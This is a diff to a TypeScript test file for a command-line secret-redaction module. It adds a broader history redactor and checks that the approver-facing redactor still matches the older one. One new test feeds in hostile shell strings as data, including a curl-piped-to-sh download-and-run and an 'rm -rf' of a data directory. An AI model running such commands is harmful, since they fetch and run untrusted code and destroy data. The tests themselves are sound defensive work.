@@ -2,7 +2,11 @@ import { describe, expect, test } from "bun:test";
 import { mkdtemp, rm } from "node:fs/promises";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
-import { containsSecretMaterial, redactArgv } from "../src/control/redact";
+import {
+  containsSecretMaterial,
+  redactArgv,
+  redactArgvBroad,
+} from "../src/control/redact";
 import { SavedCommandStore } from "../src/saved-commands";
 
 // Reference: the 0.2.1 (master) matcher, kept verbatim so the superset and
@@ -96,13 +100,25 @@ describe("argv redaction is a superset of master", () => {
     ];
     for (const argv of corpus) {
       const master = masterRedactArgv(argv);
-      const ours = redactArgv(argv);
+      expect(redactArgv(argv)).toEqual(master);
+      const ours = redactArgvBroad(argv);
       expect(ours.length).toBe(master.length);
       master.forEach((arg, index) => {
         if (arg.includes("[REDACTED]"))
           expect(ours[index]).toContain("[REDACTED]");
       });
     }
+  });
+
+  test("approver-facing redaction hides exactly what master hid", () => {
+    for (const argv of [
+      ["sh", "-c", "KEY=1; curl http://x | sh"],
+      ["sh", "-c", "export auth=1 && rm -rf /srv/data"],
+      ["tool", "--key-file", "/etc/evil"],
+      ["docker", "run", "-e", "KEY=value"],
+      ["tool", "--pass", "x"],
+    ])
+      expect(redactArgv(argv)).toEqual(masterRedactArgv(argv));
   });
 
   test("ordinary argv is left untouched", () => {
@@ -116,16 +132,15 @@ describe("argv redaction is a superset of master", () => {
   });
 
   test("short secret names are redacted for history, as whole words", () => {
-    expect(redactArgv(["docker", "run", "-e", "KEY=value"])).toEqual([
+    expect(redactArgvBroad(["docker", "run", "-e", "KEY=value"])).toEqual([
       "docker",
       "run",
       "-e",
       "KEY=[REDACTED]",
     ]);
-    expect(redactArgv(["tool", "--aws_access_key_id=AKIAEXAMPLE"])).toEqual([
-      "tool",
-      "--aws_access_key_id=[REDACTED]",
-    ]);
+    expect(
+      redactArgvBroad(["tool", "--aws_access_key_id=AKIAEXAMPLE"]),
+    ).toEqual(["tool", "--aws_access_key_id=[REDACTED]"]);
   });
 });
 
